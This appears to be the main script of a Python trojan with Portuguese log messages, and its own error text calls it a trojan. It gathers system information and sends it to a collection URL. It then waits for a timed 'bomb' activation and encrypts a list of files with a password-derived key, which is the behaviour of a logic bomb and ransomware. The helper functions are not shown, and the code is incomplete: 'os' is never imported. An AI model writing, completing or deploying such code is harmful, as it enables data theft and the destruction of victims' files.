import logging
import config 
import utils

logging.basicConfig(level=logging.INFO)

def main():
    try:
        system_info = collect_system_info()
        send_data(system_info, DATA_COLLECTION_URL)
        logging.info('Informações do sistema enviadas com sucesso.')   

        wait_for_activation(BOMB_DELAY)
        if check_activation(BOMB_ACTIVATION_TIME):
            logging.info('Bomba ativada com sucesso.')

            salt = os.urandom(16)
            key = derive_key(PASSWORD, salt)

            for file_path in FILES_TO_ENCRYPT:
                iv, encrypted_data = encrypt_file(file_path, key)
                save_backup(file_path, iv, encrypted_data, key)

    except Exception as e:
        logging.error(f'Erro na execução do trojan: {e}')

if __name__ == '__main__':
    main()